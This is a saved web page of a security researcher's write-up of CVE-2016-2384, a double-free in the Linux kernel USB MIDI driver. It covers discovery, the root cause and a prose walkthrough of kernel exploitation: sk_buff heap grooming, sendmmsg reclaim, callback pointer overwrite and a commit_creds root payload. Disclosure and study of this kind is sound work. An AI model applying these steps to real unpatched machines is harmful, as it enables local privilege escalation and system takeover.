<!DOCTYPE html>
<!-- saved from url=(0044)https://xairy.io/articles/2016/cve-2016-2384 -->
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.7.1 -->
<title>CVE-2016-2384: Exploiting a double-free in the Linux kernel USB MIDI driver | Andrey Konovalov</title>
<meta name="generator" content="Jekyll v4.2.0">
<meta property="og:title" content="CVE-2016-2384: Exploiting a double-free in the Linux kernel USB MIDI driver">
<meta property="og:locale" content="en_US">
<meta name="description" content="While playing around with the vUSBf kernel fuzzer, I found a vulnerability (CVE-2016-2384) in the Linux kernel USB MIDI driver. I reproduced the bug with a Facedancer21 board and wrote an exploit to gain code execution within the kernel. My exploit does require userspace cooperation, but the bug is exploitable externally provided one finds the right primitives.">
<meta property="og:description" content="While playing around with the vUSBf kernel fuzzer, I found a vulnerability (CVE-2016-2384) in the Linux kernel USB MIDI driver. I reproduced the bug with a Facedancer21 board and wrote an exploit to gain code execution within the kernel. My exploit does require userspace cooperation, but the bug is exploitable externally provided one finds the right primitives.">
<link rel="canonical" href="https://xairy.io/articles/2016/cve-2016-2384">
<meta property="og:url" content="https://xairy.io/articles/2016/cve-2016-2384">
<meta property="og:site_name" content="Andrey Konovalov">
<meta property="og:type" content="article">
<meta property="article:published_time" content="2016-02-22T00:00:00-06:00">
<meta name="twitter:card" content="summary">
<meta property="twitter:title" content="CVE-2016-2384: Exploiting a double-free in the Linux kernel USB MIDI driver">
<meta name="twitter:site" content="@andreyknvl">
<script type="application/ld+json">
{"headline":"CVE-2016-2384: Exploiting a double-free in the Linux kernel USB MIDI driver","dateModified":"2016-02-22T00:00:00-06:00","datePublished":"2016-02-22T00:00:00-06:00","url":"https://xairy.io/articles/2016/cve-2016-2384","description":"While playing around with the vUSBf kernel fuzzer, I found a vulnerability (CVE-2016-2384) in the Linux kernel USB MIDI driver. I reproduced the bug with a Facedancer21 board and wrote an exploit to gain code execution within the kernel. My exploit does require userspace cooperation, but the bug is exploitable externally provided one finds the right primitives.","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://xairy.io/articles/2016/cve-2016-2384"},"@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->
<style class="anchorjs"></style><link rel="stylesheet" href="./2016 - CVE-2016-2384 exploiting a double-free in the usb-midi linux kernel driver_files/main.css"><link type="application/atom+xml" rel="alternate" href="https://xairy.io/feed.xml" title="Andrey Konovalov"><script async="" src="./2016 - CVE-2016-2384 exploiting a double-free in the usb-midi linux kernel driver_files/js"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());
  gtag('config', 'G-P7FXTKJ4LV');
</script>
<script>
// https://stackoverflow.com/a/19657772

function getElementColor(elm) {
  var bg = getComputedStyle(elm).backgroundColor;
  bg = bg.match(/\((.*)\)/)[1];
  bg = bg.split(",");
  for (var i = 0; i < bg.length; i++) {
    bg[i] = parseInt(bg[i], 10);
  }
  if (bg.length > 3) {
    bg.pop();
  }
  return bg;
}

// Converts RGB array [32, 64, 128] to hex color string #204080.
function rgb2hex(colorArray) {
  var color = [];
  for (var i = 0; i < colorArray.length; i++) {
    var hex = colorArray[i].toString(16);
    if (hex.length < 2) { hex = "0" + hex; }
    color.push(hex);
  }
  return "#" + color.join("");
}

function setElementColor(elm, color) {
  elm.style.backgroundColor = rgb2hex(color);
}

function random(min, max) {
  return Math.floor(Math.random() * (max - min) + min);
}

function randomColor() {
  colors = [0xFFDDDD, 0xFFEEDD, 0xFFFFDD, 0xEEFFDD, 0xDDFFDD, 0xDDFFEE,
            0xDDFFFF, 0xDDEEFF, 0xDDDDFF, 0xEEDDFF, 0xFFDDFF, 0xFFDDEE];
  var hex = colors[random(0, colors.length)];
  var color = [];
  for (var i = 0; i < 3; i++) {
    color.unshift(hex % 256);
    hex = Math.floor(hex / 256);
  }
  return color;
}

var transElements = null;
var transHandler = null;

document.addEventListener('readystatechange', (event) => {
  if (document.readyState !== 'interactive')
    return;

  transElements = [
    document.getElementById("site-header"),
    document.getElementById("site-footer")
  ]

  currentColor = randomColor();
  for (var i = 0; i < transElements.length; i++) {
    setElementColor(transElements[i], currentColor);
  }

  startTransition();
});

function startTransition() {
  currentColor = getElementColor(transElements[0]);
  targetColor = randomColor();

  clearInterval(transHandler);
  transHandler = setInterval(function() {
    transition();
  }, 400);
}

function transition() {
  var changed = false;

  // Adjust the color.
  for (var i = 0; i < 3; i++) {
    if (currentColor[i] > targetColor[i]) {
      currentColor[i]--;
      changed = true;
    } else if (currentColor[i] < targetColor[i]) {
      currentColor[i]++;
      changed = true;
    }
  }

  // Apply the new color.
  for (var i = 0; i < transElements.length; i++)
    setElementColor(transElements[i], currentColor);

  // Check if the transition ended. Start another one if so.
  if (!changed)
    startTransition();
}
</script></head>

<body><header id="site-header" class="site-header" role="banner" style="background-color: rgb(239, 237, 222);">
  <div class="wrapper centered">
    <a id="title-link" class="site-title" rel="author" href="https://xairy.io/">Andrey Konovalov</a>
  </div>
</header>

<div class="site-nav-wrapper">
  <div class="wrapper centered"><nav class="site-nav">
        <input type="checkbox" id="nav-trigger" class="nav-trigger">
        <label for="nav-trigger">
          <span class="menu-icon">
            <svg viewBox="0 0 18 15" width="18px" height="15px">
              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"></path>
            </svg>
          </span>
        </label>

        <div class="trigger"><a class="page-link" href="https://xairy.io/articles/">Articles</a><a class="page-link" href="https://xairy.io/talks/">Talks</a><a class="page-link" href="https://xairy.io/projects/">Projects</a><a class="page-link" href="https://xairy.io/about">About</a></div>
      </nav></div>
</div>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post h-entry" itemscope="" itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <script src="./2016 - CVE-2016-2384 exploiting a double-free in the usb-midi linux kernel driver_files/anchor.min.js.下載"></script>
    <script src="./2016 - CVE-2016-2384 exploiting a double-free in the usb-midi linux kernel driver_files/jquery-3.6.0.min.js.下載"></script>

    <script>
      $(function() {
        anchors.options.visible = 'hover';
        anchors.options.placement = 'left';
        anchors.add('.post-content > h1, h2, h3, h4, h5, h6');
      });
    </script>

    <style>
      .anchorjs-link:after {
        color: grey;
      }
    </style>

    <h1 class="post-title p-name" itemprop="name headline">CVE-2016-2384: Exploiting a double-free in the Linux kernel USB MIDI driver</h1>
    <p class="post-meta">
      <time class="dt-published" datetime="2016-02-22T00:00:00-06:00" itemprop="datePublished">Feb 22, 2016
      </time></p>
  </header>

  <div class="post-content e-content" itemprop="articleBody">
    <div style="position: relative; width: 100%; padding-bottom: 56.25%; margin-bottom: 16px;">
	<iframe src="./2016 - CVE-2016-2384 exploiting a double-free in the usb-midi linux kernel driver_files/lfl1NJn1nvo.html" frameborder="0" allowfullscreen="true" mozallowfullscreen="true" webkitallowfullscreen="true" style="position: absolute; top: 0; left: 0; width:100%; height: 100%; border: 0;"></iframe>
</div>

<p>While playing around with the <a href="https://github.com/schumilo/vUSBf">vUSBf</a> kernel fuzzer, I found a vulnerability (<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-2384">CVE-2016-2384</a>) in the Linux kernel USB MIDI driver.
I reproduced the bug with a <a href="http://goodfet.sourceforge.net/hardware/facedancer21/">Facedancer21</a> board and wrote an <a href="https://github.com/xairy/kernel-exploits/blob/master/CVE-2016-2384/poc.c">exploit</a> to gain code execution within the kernel.
My exploit does require userspace cooperation, but the bug is exploitable externally provided one finds the right primitives.</p>

<!--end_excerpt-->

<h2 id="overview"><a class="anchorjs-link " aria-label="Anchor" data-anchorjs-icon="" href="https://xairy.io/articles/2016/cve-2016-2384#overview" style="font-style: normal; font-variant: normal; font-weight: normal; font-stretch: normal; font-size: 1em; line-height: inherit; font-family: anchorjs-icons; position: absolute; margin-left: -1em; padding-right: 0.5em;"></a>Overview</h2>

<p>The vulnerability can be exploited in two ways:</p>

<ol>
  <li>
    <p>Denial of service.
Requires physical access (ability to plug in a malicious USB device).
All the kernel versions seem to be vulnerable to this attack.
I managed to cause a kernel panic on real machines with the following kernels:
Ubuntu 14.04 (3.19.0-49-generic), Linux Mint 17.3 (3.19.0-32-generic), Fedora 22 (4.1.5-200.fe22.x86_64) and CentOS 6 (2.6.32-584.12.2.e16.x86_64).</p>
  </li>
  <li>
    <p>Arbitrary code execution with ring 0 privileges (and therefore a privilege escalation).
Requires both physical and local access (ability to plug in a malicious USB device and to execute a malicious binary as a non-privileged user).
All the kernel versions starting from v3.0 seem to be vulnerable to this attack.
I managed to gain root privileges on real machines with the following kernels:
Ubuntu 14.04 (3.19.0-49-generic), Linux Mint 17.3 (3.19.0-32-generic) and Fedora 22 (4.1.5-200.fe22.x86_64).
All machines had SMEP turned on, but didn’t have SMAP.</p>
  </li>
</ol>

<p>A proof-of-concept exploit (<a href="https://github.com/xairy/kernel-exploits/blob/master/CVE-2016-2384/poc.c">poc.c</a>, <a href="https://github.com/xairy/kernel-exploits/blob/master/CVE-2016-2384/poc.py">poc.py</a>) is provided for both types of attacks.
The provided exploit uses a <a href="http://goodfet.sourceforge.net/hardware/facedancer21/">Facedancer21</a> board to physically emulate the malicious USB device.
The provided exploit bypasses SMEP, but doesn’t bypass SMAP (though it might be possible to do).
It has about 50% success rate (the kernel crashes on failure), but this can probably be improved.
Check out <a href="https://www.youtube.com/watch?v=lfl1NJn1nvo">the demo video</a>.</p>

<p>It should actually be possible to make the entire exploit for the arbitrary code execution hardware only and therefore eliminate the local access requirement, but this approach wasn’t thoroughly investigated.</p>

<p><strong>Update fom 2021</strong>:
Martijn Bogaard and Dana Geist have managed to exploit this bug purely over USB; see their <a href="https://i.blackhat.com/EU-21/Thursday/EU-21-Bogaard-Geist-Achieving-Linux-Kernel-Code-Execution-Through-A-Malicious-USB-Device.pdf">Achieving Linux Kernel Code Execution Through a Malicious USB Device</a> talk for details.</p>

<p>The vulnerability was found with <a href="https://github.com/google/kasan">KASAN</a> (KernelAddressSanitizer, a kernel memory error detector) and <a href="https://github.com/schumilo/vUSBf">vUSBf</a> (a virtual usb fuzzer).</p>

<p>The vulnerability is present only if the USB MIDI module is enabled, but as far as I can see many modern distributions do this.
The bug has been <a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=07d86ca93db7e5cdf4743564d98292042ec21af7">fixed upstream</a>.</p>

<h2 id="the-bug"><a class="anchorjs-link " aria-label="Anchor" data-anchorjs-icon="" href="https://xairy.io/articles/2016/cve-2016-2384#the-bug" style="font-style: normal; font-variant: normal; font-weight: normal; font-stretch: normal; font-size: 1em; line-height: inherit; font-family: anchorjs-icons; position: absolute; margin-left: -1em; padding-right: 0.5em;"></a>The bug</h2>

<p>The issue with the USB-MIDI driver is a double-free of a <code class="language-plaintext highlighter-rouge">snd_usb_midi</code> object, which occurs when a Midiman USB device with invalid number of endpoints is plugged in.
I used a <a href="http://goodfet.sourceforge.net/hardware/facedancer21/">Facedancer21</a> board to physically emulate such USB device.
If you don’t know what a USB endpoint is or if you’re overall interested in how the USB protocol works, I suggest reading up on it <a href="http://www.beyondlogic.org/usbnutshell/usb1.shtml">here</a>.</p>

<p>When a USB device is plugged in, the kernel determines which driver is responsible for this device and calls the corresponding <code class="language-plaintext highlighter-rouge">probe()</code> function.
During probing the driver performs various initialization of the device.
When probing our crafted USB MIDI device everything goes alright until the end of <code class="language-plaintext highlighter-rouge">snd_usbmidi_create()</code> when the following code is executed:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="n">quirk</span> <span class="o">&amp;&amp;</span> <span class="n">quirk</span><span class="o">-&gt;</span><span class="n">type</span> <span class="o">==</span> <span class="n">QUIRK_MIDI_MIDIMAN</span><span class="p">)</span>
        <span class="n">err</span> <span class="o">=</span> <span class="n">snd_usbmidi_create_endpoints_midiman</span><span class="p">(</span><span class="n">umidi</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">endpoints</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
<span class="k">else</span>
        <span class="n">err</span> <span class="o">=</span> <span class="n">snd_usbmidi_create_endpoints</span><span class="p">(</span><span class="n">umidi</span><span class="p">,</span> <span class="n">endpoints</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span><span class="n">err</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">snd_usbmidi_free</span><span class="p">(</span><span class="n">umidi</span><span class="p">);</span>
        <span class="k">return</span> <span class="n">err</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Since we’re using a Midiman device, the first if branch is executed and <code class="language-plaintext highlighter-rouge">snd_usbmidi_create_endpoints_midiman()</code> gets called.
This function performs initialization of USB endpoints specific to Midiman devices.
If we provide an invalid number of endpoints in the USB device descriptior (say zero), then
<code class="language-plaintext highlighter-rouge">snd_usbmidi_create_endpoints_midiman()</code> fails on the following check:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="n">intfd</span><span class="o">-&gt;</span><span class="n">bNumEndpoints</span> <span class="o">&lt;</span> <span class="p">(</span><span class="n">endpoint</span><span class="o">-&gt;</span><span class="n">out_cables</span> <span class="o">&gt;</span> <span class="mh">0x0001</span> <span class="o">?</span> <span class="mi">5</span> <span class="o">:</span> <span class="mi">3</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">dev_dbg</span><span class="p">(</span><span class="o">&amp;</span><span class="n">umidi</span><span class="o">-&gt;</span><span class="n">dev</span><span class="o">-&gt;</span><span class="n">dev</span><span class="p">,</span> <span class="s">"not enough endpoints</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="k">return</span> <span class="o">-</span><span class="n">ENOENT</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>After that <code class="language-plaintext highlighter-rouge">snd_usbmidi_free()</code> gets called, which frees the <code class="language-plaintext highlighter-rouge">snd_usb_midi</code> object.
Then, since the device probing failed, various clean up routines are invoked,
and one of them calls <code class="language-plaintext highlighter-rouge">snd_usbmidi_free()</code> again on the same object.
This results in a double free.
<a href="https://github.com/xairy/kernel-exploits/blob/master/CVE-2016-2384/kasan.txt">Here</a> is the <a href="https://github.com/google/kasan">KASAN</a> report with the exact stack traces (line numbers are for the upstream kernel v4.4).
KASAN reports it as a use-after-free, since the code uses the <code class="language-plaintext highlighter-rouge">snd_usb_midi</code> object in between the two <code class="language-plaintext highlighter-rouge">kfree()</code>s and that is what KASAN detects.</p>

<p>The bug is only triggered with the device IDs that are listed with <code class="language-plaintext highlighter-rouge">QUIRK_MIDI_MIDIMAN</code> in <code class="language-plaintext highlighter-rouge">sound/usb/quirks-table.h</code>.
There’s also an else branch which could fail, but as pointed out by one of the kernel developers, for other USB MIDI devices, the USB descriptors are checked earlier, and the only way that <code class="language-plaintext highlighter-rouge">snd_usbmidi_create_endpoints()</code> could fail would be to run out of memory.</p>

<p><a href="https://github.com/xairy/kernel-exploits/blob/master/CVE-2016-2384/device.txt">Here</a> is the descriptor of the USB device I used to trigger the bug.
The important parameters are: <code class="language-plaintext highlighter-rouge">idVendor = 0x0763</code> (Midiman), <code class="language-plaintext highlighter-rouge">idProduct = 0x1002</code> (MidiSport 2x2)
and one of the configurations should have an interface with <code class="language-plaintext highlighter-rouge">bInterfaceClass = 255</code> and zero endpoints.
The <code class="language-plaintext highlighter-rouge">idProduct</code> might be any of the supported Midiman devices.</p>

<h2 id="exploitation"><a class="anchorjs-link " aria-label="Anchor" data-anchorjs-icon="" href="https://xairy.io/articles/2016/cve-2016-2384#exploitation" style="font-style: normal; font-variant: normal; font-weight: normal; font-stretch: normal; font-size: 1em; line-height: inherit; font-family: anchorjs-icons; position: absolute; margin-left: -1em; padding-right: 0.5em;"></a>Exploitation</h2>

<p>Now let’s see how we can exploit this.</p>

<h3 id="denial-of-service"><a class="anchorjs-link " aria-label="Anchor" data-anchorjs-icon="" href="https://xairy.io/articles/2016/cve-2016-2384#denial-of-service" style="font-style: normal; font-variant: normal; font-weight: normal; font-stretch: normal; font-size: 1em; line-height: inherit; font-family: anchorjs-icons; position: absolute; margin-left: -1em; padding-right: 0.5em;"></a>Denial of service</h3>

<p>Causing a denial of service is fairly easy.
A double-free causes quite a harmful corruption of the kernel allocator.
So the only thing we need to do is to connect the USB device (maybe a few times) and the kernel crashes.
It requires only physical access to the machine.
<a href="https://github.com/xairy/kernel-exploits/blob/master/CVE-2016-2384/poc.py">Here</a> is a script meant to be used with a <a href="http://goodfet.sourceforge.net/hardware/facedancer21/">Facedancer21</a> to emulate the USB device described above.</p>

<h3 id="arbitrary-code-execution"><a class="anchorjs-link " aria-label="Anchor" data-anchorjs-icon="" href="https://xairy.io/articles/2016/cve-2016-2384#arbitrary-code-execution" style="font-style: normal; font-variant: normal; font-weight: normal; font-stretch: normal; font-size: 1em; line-height: inherit; font-family: anchorjs-icons; position: absolute; margin-left: -1em; padding-right: 0.5em;"></a>Arbitrary code execution</h3>

<p>Executing arbitrary code is also possible, but is more difficult to achieve.
Here’s how I did it, though it’s obviously not the only possible way.
Overall, I turned this double-free into a racy-use-after-free and managed to overwrite an object with a pointer to another object which holds a function pointer, while the first object is still being used by the kernel.
Let’s go through it step by step.</p>

<p>If you have no idea how the linux kernel slab allocators work or you don’t know what <code class="language-plaintext highlighter-rouge">kmalloc()</code> caches are, read up on it somewhere (for example <a href="http://www.jikos.cz/jikos/Kmalloc_Internals.html">here</a>, though it’s somewhat outdated).</p>

<p>A <code class="language-plaintext highlighter-rouge">snd_usb_midi</code> object is allocated by the kernel via <code class="language-plaintext highlighter-rouge">kmalloc()</code> and falls into the <code class="language-plaintext highlighter-rouge">kmalloc-512</code> cache.
Each time a network packet is sent an <code class="language-plaintext highlighter-rouge">sk_buff</code> object is created by the kernel.
It’s just happens that any <code class="language-plaintext highlighter-rouge">sk_buff</code> object is also allocated via <code class="language-plaintext highlighter-rouge">kmalloc()</code> and might fall into <code class="language-plaintext highlighter-rouge">kmalloc-512</code> cache depending on the packet size (for example it happens with 128-bytes packets).</p>

<p>Using the double-free discribed above it’s possible to cause a use-after-free on an <code class="language-plaintext highlighter-rouge">sk_buff</code>.
Imagine that an <code class="language-plaintext highlighter-rouge">sk_buff</code> object is allocated in between the two <code class="language-plaintext highlighter-rouge">kfree()</code>s of the <code class="language-plaintext highlighter-rouge">snd_usb_midi</code> object and placed into the same slab object.
In that case, if this slab object is allocated again before it was freed as an <code class="language-plaintext highlighter-rouge">sk_buff</code>, it can be overwritten.
That’s what we’re going to do.</p>

<p>What do we get from overwriting an <code class="language-plaintext highlighter-rouge">sk_buff</code>?
Turns out that whenever an <code class="language-plaintext highlighter-rouge">sk_buff</code> is allocated, an <code class="language-plaintext highlighter-rouge">skb_shared_info</code> struct is placed at the end of it.
Let’s look at the <code class="language-plaintext highlighter-rouge">skb_shared_info</code> definition closely:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">skb_shared_info</span> <span class="p">{</span>
        <span class="kt">unsigned</span> <span class="kt">char</span>   <span class="n">nr_frags</span><span class="p">;</span>
        <span class="n">__u8</span>            <span class="n">tx_flags</span><span class="p">;</span>
        <span class="kt">unsigned</span> <span class="kt">short</span>  <span class="n">gso_size</span><span class="p">;</span>
        <span class="kt">unsigned</span> <span class="kt">short</span>  <span class="n">gso_segs</span><span class="p">;</span>
        <span class="kt">unsigned</span> <span class="kt">short</span>  <span class="n">gso_type</span><span class="p">;</span>
        <span class="k">struct</span> <span class="n">sk_buff</span>  <span class="o">*</span><span class="n">frag_list</span><span class="p">;</span>
        <span class="k">struct</span> <span class="n">skb_shared_hwtstamps</span> <span class="n">hwtstamps</span><span class="p">;</span>
        <span class="n">u32</span>             <span class="n">tskey</span><span class="p">;</span>
        <span class="n">__be32</span>          <span class="n">ip6_frag_id</span><span class="p">;</span>
        <span class="n">atomic_t</span>        <span class="n">dataref</span><span class="p">;</span>
        <span class="kt">void</span> <span class="o">*</span>          <span class="n">destructor_arg</span><span class="p">;</span>
        <span class="n">skb_frag_t</span>      <span class="n">frags</span><span class="p">[</span><span class="n">MAX_SKB_FRAGS</span><span class="p">];</span>
<span class="p">};</span>
</code></pre></div></div>

<p>An <code class="language-plaintext highlighter-rouge">skb_shared_info</code> struct has a <code class="language-plaintext highlighter-rouge">destructor_arg</code> field, which points to a <code class="language-plaintext highlighter-rouge">ubuf_info</code> struct (though it’s declared as a <code class="language-plaintext highlighter-rouge">void *</code> pointer).
Let’s take a look at the definition of the <code class="language-plaintext highlighter-rouge">ubuf_info</code>:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">ubuf_info</span> <span class="p">{</span>
        <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">callback</span><span class="p">)(</span><span class="k">struct</span> <span class="n">ubuf_info</span> <span class="o">*</span><span class="p">,</span> <span class="n">bool</span> <span class="n">zerocopy_success</span><span class="p">);</span>
        <span class="kt">void</span> <span class="o">*</span><span class="n">ctx</span><span class="p">;</span>
        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">desc</span><span class="p">;</span>
<span class="p">};</span>
</code></pre></div></div>

<p>Here we go, it contains a function pointer, which is probably called at some point.</p>

<p>So we want to overwrite the <code class="language-plaintext highlighter-rouge">destructor_arg</code> field in an <code class="language-plaintext highlighter-rouge">skb_shared_info</code> of an <code class="language-plaintext highlighter-rouge">sk_buff</code> and make it point to a crafted <code class="language-plaintext highlighter-rouge">ubuf_info</code> which has the <code class="language-plaintext highlighter-rouge">callback</code> field set to whatever we want.
For that we need to be able to do the following three things from the userspace (by calling syscalls from a binary running as an non-privileged user for example):</p>

<ol>
  <li>Allocate a 512-bytes <code class="language-plaintext highlighter-rouge">sk_buff</code></li>
  <li>Allocate a 512-bytes object via <code class="language-plaintext highlighter-rouge">kmalloc()</code> with controlled data</li>
  <li>Trigger the <code class="language-plaintext highlighter-rouge">callback</code></li>
</ol>

<p>As I mentioned before, a 512-bytes <code class="language-plaintext highlighter-rouge">sk_buff</code> is allocated whenever a 128-bytes packet is sent.
The allocated <code class="language-plaintext highlighter-rouge">sk_buff</code> won’t be freed until either the packet is delivered, failed to be delivered or the socket is closed.
So we can just create a couple of sockets and send say a UDP packet from one to the other.</p>

<p>Next, we need a way to allocate 512-bytes object with controlled data.
There’s actually a way to allocate objects from the userspace with both size and data controlled.
It can be done via sending control messages on a socket with the <code class="language-plaintext highlighter-rouge">sendmmsg()</code> syscall.
During <code class="language-plaintext highlighter-rouge">sendmmsg()</code> the kernel will allocate a buffer for the control message via <code class="language-plaintext highlighter-rouge">kmalloc()</code> and copy the message there.</p>

<p>Now, we need a way to trigger the <code class="language-plaintext highlighter-rouge">callback</code>.
It actually gets called when the corresponding <code class="language-plaintext highlighter-rouge">sk_buff</code> is being freed:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">void</span> <span class="nf">skb_release_data</span><span class="p">(</span><span class="k">struct</span> <span class="n">sk_buff</span> <span class="o">*</span><span class="n">skb</span><span class="p">)</span>
<span class="p">{</span>
        <span class="k">struct</span> <span class="n">skb_shared_info</span> <span class="o">*</span><span class="n">shinfo</span> <span class="o">=</span> <span class="n">skb_shinfo</span><span class="p">(</span><span class="n">skb</span><span class="p">);</span>
        <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">skb</span><span class="o">-&gt;</span><span class="n">cloned</span> <span class="o">&amp;&amp;</span>
            <span class="n">atomic_sub_return</span><span class="p">(</span><span class="n">skb</span><span class="o">-&gt;</span><span class="n">nohdr</span> <span class="o">?</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="n">SKB_DATAREF_SHIFT</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span> <span class="o">:</span> <span class="mi">1</span><span class="p">,</span>
                              <span class="o">&amp;</span><span class="n">shinfo</span><span class="o">-&gt;</span><span class="n">dataref</span><span class="p">))</span>
                <span class="k">return</span><span class="p">;</span>

        <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">shinfo</span><span class="o">-&gt;</span><span class="n">nr_frags</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
                <span class="n">__skb_frag_unref</span><span class="p">(</span><span class="o">&amp;</span><span class="n">shinfo</span><span class="o">-&gt;</span><span class="n">frags</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>

        <span class="cm">/*
         * If skb buf is from userspace, we need to notify the caller
         * the lower device DMA has done;
         */</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">shinfo</span><span class="o">-&gt;</span><span class="n">tx_flags</span> <span class="o">&amp;</span> <span class="n">SKBTX_DEV_ZEROCOPY</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">struct</span> <span class="n">ubuf_info</span> <span class="o">*</span><span class="n">uarg</span><span class="p">;</span>

                <span class="n">uarg</span> <span class="o">=</span> <span class="n">shinfo</span><span class="o">-&gt;</span><span class="n">destructor_arg</span><span class="p">;</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">uarg</span><span class="o">-&gt;</span><span class="n">callback</span><span class="p">)</span>
                        <span class="n">uarg</span><span class="o">-&gt;</span><span class="n">callback</span><span class="p">(</span><span class="n">uarg</span><span class="p">,</span> <span class="nb">true</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">shinfo</span><span class="o">-&gt;</span><span class="n">frag_list</span><span class="p">)</span>
                <span class="n">kfree_skb_list</span><span class="p">(</span><span class="n">shinfo</span><span class="o">-&gt;</span><span class="n">frag_list</span><span class="p">);</span>

        <span class="n">skb_free_head</span><span class="p">(</span><span class="n">skb</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>As you can see, it only get’s called when <code class="language-plaintext highlighter-rouge">shinfo-&gt;tx_flags</code> has the <code class="language-plaintext highlighter-rouge">SKBTX_DEV_ZEROCOPY</code> flag set, but we can overwrite it with the desired value as well as the <code class="language-plaintext highlighter-rouge">destructor_arg</code>.</p>

<p>So what we’re going for is the following sequence of events:</p>

<ol>
  <li><code class="language-plaintext highlighter-rouge">snd_usb_midi</code> freed</li>
  <li><code class="language-plaintext highlighter-rouge">sk_buff</code> allocated on the same place when sending a packet on a socket</li>
  <li><code class="language-plaintext highlighter-rouge">snd_usb_midi</code> freed again, therefore freeing the <code class="language-plaintext highlighter-rouge">sk_buff</code>, which is actually still being used</li>
  <li>a chunk of memory is allocated by <code class="language-plaintext highlighter-rouge">sendmmsg()</code> on the same place, overwriting the <code class="language-plaintext highlighter-rouge">skb_shared_info</code> in the <code class="language-plaintext highlighter-rouge">sk_buff</code></li>
  <li><code class="language-plaintext highlighter-rouge">sk_buff</code> freed, therefore triggering the <code class="language-plaintext highlighter-rouge">callback</code></li>
</ol>

<p>This can be achieved by opening multiple sockets and sending 128-bytes packets as well as control messages in a loop and connecting the usb device at the same time.
This racy approach really relies on a set of <code class="language-plaintext highlighter-rouge">kmalloc()</code> and <code class="language-plaintext highlighter-rouge">kfree()</code> calls that happen in the right order, but the exploit I wrote seems to be working with fairly good success rate.
As a result we control the <code class="language-plaintext highlighter-rouge">callback</code> value, we can point it to any payload, which is going to be executed with kernel privileges.
By using a classic <code class="language-plaintext highlighter-rouge">commit_creds(prepare_kernel_cred(0))</code> payload we can gain root access.</p>

<p>Where do we allocate the <code class="language-plaintext highlighter-rouge">ubuf_info</code> struct, which actually holds the <code class="language-plaintext highlighter-rouge">callback</code> pointer?
The most simple way is to allocate it in the userspace (as a global variable or with <code class="language-plaintext highlighter-rouge">mmap()</code>).
The same goes for the payload that gets executed (however we can use ROP, read below).</p>

<p>The version v3.0+ requirement comes from the fact the the <code class="language-plaintext highlighter-rouge">callback</code> field wasn’t present before v3.0.
However, there might be some other in-kernel objects of size 512 with function pointers in them,
which can be used for exploitation.</p>

<h3 id="kernel-hardening"><a class="anchorjs-link " aria-label="Anchor" data-anchorjs-icon="" href="https://xairy.io/articles/2016/cve-2016-2384#kernel-hardening" style="font-style: normal; font-variant: normal; font-weight: normal; font-stretch: normal; font-size: 1em; line-height: inherit; font-family: anchorjs-icons; position: absolute; margin-left: -1em; padding-right: 0.5em;"></a>Kernel hardening</h3>

<p>The Linux kernel has support for a few hardening features that make exploitation more difficult. For instance there are <a href="http://vulnfactory.org/blog/2011/06/05/smep-what-is-it-and-how-to-beat-it-on-linux/">SMEP</a> (Supervisor Mode Execution Protection) and <a href="https://lwn.net/Articles/517475/">SMAP</a> (Supervisor Mode Access Prevention).
SMEP causes an oops whenever the kernel tries to execute code from the userspace memory and SMAP causes an oops whenever the kernel tries to access the userspace memory directly.</p>

